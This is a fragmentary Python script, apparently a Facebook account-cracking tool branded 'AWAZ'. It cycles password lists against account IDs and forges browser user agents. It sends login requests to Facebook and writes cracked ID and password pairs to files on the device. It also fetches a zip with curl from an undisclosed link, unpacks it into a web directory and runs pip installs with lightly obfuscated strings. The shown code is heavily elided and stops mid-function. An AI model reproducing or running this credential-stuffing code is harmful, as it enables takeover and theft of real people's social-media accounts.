...
if 'aarch64' in str(find_aarch):
        ...
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{awaz_tech}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{awaz_tech}.zip')
        os.system('python AWAZ.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{awaz_tech}.zip {http_directory}')
        ...
        os.system(f'cd {http_directory} && unzip crypto{awaz_tech}.zip -d {http_directory} > /dev/null')
try:
        ...
        os.system('pip install futures==2 && python AWAZ.py')
...
lll = ("https://www.facebook.com/AwazTech")
#----[remover]-----
...
for xd in range(10000):
        ...
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (AWAZ, like Gecko) Chrome/'
...
for agent in range(10000):
        ...
        g='AppleWebKit/537.36 (AWAZ, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
...
$$ |  $$ |$$ | $$ | $$ |$$  __$$ | $$  _/   $$ |$$   ____|$$ |      $$ |  $$ |
$$ |  $$ |\$$$$$\$$$$  |\$$$$$$$ |$$$$$$$$\ $$ |\$$$$$$$\ \$$$$$$$\ $$ |  $$ |
\__|  \__| \_____\____/  \_______|\________|\__| \_______| \_______|\__|  \__|
\033[1;32m+=========================================================+
|   Owner        :   Mohammad Tanha
|   Facebook     :   Mohammad Tanha
|   Telegram     :  @Awaz_Tech
|   Tools        :     Awaz
|   Versino      :     1.1.3
+=========================================================+""")
...
def zea1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [AWAZ-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ZEA:
                                ...
                                print('\r\r\033[1;32m [AWAZ-OK] %s • %s'%(ids,pas))
                                open('/sdcard/AWAZ-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWAZ:
                                if 'y' in pcp:
                                        print#('\r\r\x1b[38;5;208m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AWAZ-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def zea2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;32m [AWAZ-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def zeast():
    ...
    print(' Ids saved in AWAZ-OK.txt,in cp AWAZ-CP.txt')
    linex()
...
def rcrack(uid,pwx,tl):
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryqsZJWBXOblLr8hpL',
...
params = {
    'fb_dtsg': 'NAcNcTuGwSnjrt1ABYr-PTOPTL8vkUXwFDEoVqPt2He_HWEqF8m5enQ:0:0',
    'jazoest': '24987',
    'lsd': 'AVocdOM3hl4',
    '__dyn': '1Z3pawlEaU4ifDg9ppkdxu3q12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65xO2O1Vwro0wa4o1MU88C0NE3mw5Uwp817U2ew4Kwww4WwSyE1582ZwrU2pw8O0zUdE',
    '__csr': '',
    '__req': '4',
    '__a': 'AYn49rxBH6QLFjphbNqQigi4d4JbQYu84cyzrro4am8rh6rrnajRqR80OWCkz72TjANN4k4hM22IexHXl2DLhnYFeesfpXWhqDDFiUVTyapX_g',
    '__user': '0',
}

data = '------WebKitFormBoundaryqsZJWBXOblLr8hpL\r\nContent-Disposition: form-data; name="ts"\r\n\r\n1689889462037\r\n------WebKitFormBoundaryqsZJWBXOblLr8hpL\r\nContent-Disposition: form-data; name="q"\r\n\r\n[{"app_id":"412378670482","posts":"","user":"0","webSessionId":"c8c2ll:k0m4du:hn7l62","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":8}]\r\n------WebKitFormBoundaryqsZJWBXOblLr8hpL--\r\n'

response = requests.post('https://m.facebook.com/a/bz', params=params, cookies=cookies, headers=headers, data=data)
            'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AWAZ-OK] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/AWAZ-OK.txt', 'a').write(cid+' • '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[AWAZ-CP] '+uid+' • '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r[AWAZ] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def ZEA():
        try:
                ...
                if x == ("zea"):
                        ...
                        if xd in ['3','03']:
                        	os.system('xdg-open https://www.facebook.com/AwazTech');menu()
                        if xd in ['2','02']:
                        	rdm()
                        if xd in ['1','01']:
